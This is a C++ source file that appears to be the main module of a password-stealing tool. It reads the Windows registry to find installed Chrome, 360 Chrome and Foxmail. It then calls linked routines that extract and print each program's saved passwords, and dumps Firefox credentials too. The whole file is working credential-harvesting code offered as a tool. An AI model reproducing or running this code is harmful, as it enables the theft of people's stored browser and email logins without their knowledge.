
#include "chrome.h"
#include "pwd_aio.h"

#include <iostream>
#include <Windows.h>
#include <stdio.h>


extern "C" int Get_Firefox_Passwd();
const char *_360CHROME_EXE = "360chrome.exe";
const char *CHROME_EXE = "chrome.exe";
const char *FOXMAIL_EXE = "Foxmail.exe";


char* get_exe_path(const char* exefile){
    HKEY hKey;
    char* szProductType = (char *)malloc(255);
    char reg_key[255] = {0};
    DWORD dwBufLen = 255;
    LONG lRet;

    sprintf(reg_key, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\%s", exefile);

    // 下面是打开注册表, 只有打开后才能做其他操作
    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, // 要打开的根键
        TEXT(reg_key), // 要打开的子子键
        0, // 这个一定要为0
        KEY_QUERY_VALUE,    // 指定打开方式,此为读
        &hKey); // 用来返回句柄
    if (lRet == ERROR_SUCCESS) // 判断是否打开成功
    {
        // 打开注册表成功
        // 开始查询
        lRet = RegQueryValueEx(hKey, // 打开注册表时返回的句柄
            TEXT("Path"), //要查询的名称
            NULL, // 一定为NULL或者0
            NULL,
            (LPBYTE)szProductType, // 我们要的东西放在这里
            &dwBufLen);
        if (lRet == ERROR_SUCCESS) // 判断是否查询成功
        {
            RegCloseKey(hKey);
            // printf("dir -> %s\n", szProductType);
            return szProductType;
        }
        else
        {
            // cout << "Ge" << endl;
            return NULL;
        }
    }
    else {
        // cout << "未安装" << exefile << "!" << endl;
        return NULL;
    }
}


char* get_foxmail_path(){
    HKEY hKey;
    char* szProductType = (char *)malloc(255);
    char reg_key[] = "SOFTWARE\\Classes\\Foxmail\\shell\\open\\command";
    DWORD dwBufLen = 255;
    LONG lRet;
    std::string foxmail_loc;
    char *foxmail_path = (char *)malloc(255);

    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, // 要打开的根键
        TEXT(reg_key), // 要打开的子子键
        0, // 这个一定要为0
        KEY_QUERY_VALUE,    // 指定打开方式,此为读
        &hKey); // 用来返回句柄
    if (lRet == ERROR_SUCCESS) // 判断是否打开成功
    {
        // 打开注册表成功
        // 开始查询
        lRet = RegQueryValueEx(hKey, // 打开注册表时返回的句柄
            NULL, //要查询的名称
            NULL, // 一定为NULL或者0
            NULL,
            (LPBYTE)szProductType, // 我们要的东西放在这里
            &dwBufLen);
        if (lRet == ERROR_SUCCESS) // 判断是否查询成功
        {
            RegCloseKey(hKey);
            foxmail_loc = szProductType;
            memcpy(foxmail_path, foxmail_loc.substr(1, foxmail_loc.size() - 5).c_str(), foxmail_loc.size() - 17);
            free(szProductType);
            return foxmail_path;
        }
        else
        {
            return NULL;
        }
    }
    else {
        return NULL;
    }
}


int main(int argc, char* argv[]){
    GoString str;
    str.p = NULL;
    str.n = 0;
    char* chrome_path = get_exe_path(CHROME_EXE);
    char* _360chrome_path = get_exe_path(_360CHROME_EXE);
    char *_foxmail_path = get_foxmail_path();
    // std::cout << "foxmail: " << _foxmail_path << std::endl;

    char _360chrome_data_path[255];
    char foxmail_path[255];

    if (chrome_path != NULL){
        printf("====================\nGoogle Chrome ->\n");
        Get_Chrome_Passwd(str);
        printf("\n\n");
    }

    if (_360chrome_path != NULL){
        printf("====================\n360 Chrome ->\n");
        sprintf(_360chrome_data_path, "%s\\..\\User Data", _360chrome_path);
        // printf("360Chrome data path->%s\n", _360chrome_data_path);
        str.p = _360chrome_data_path;
        str.n = strlen(_360chrome_data_path);
        Get_Chrome_Passwd(str);
        printf("\n\n");
    }

    printf("====================\nFirefox ->\n");
    Get_Firefox_Passwd();

    if (_foxmail_path != NULL){
        printf("\n\n====================\nFoxmail ->\n");
        sprintf(foxmail_path, "%s\\.", _foxmail_path);
        Get_Foxmail_Passwd(foxmail_path);
    }

    return 0;
}
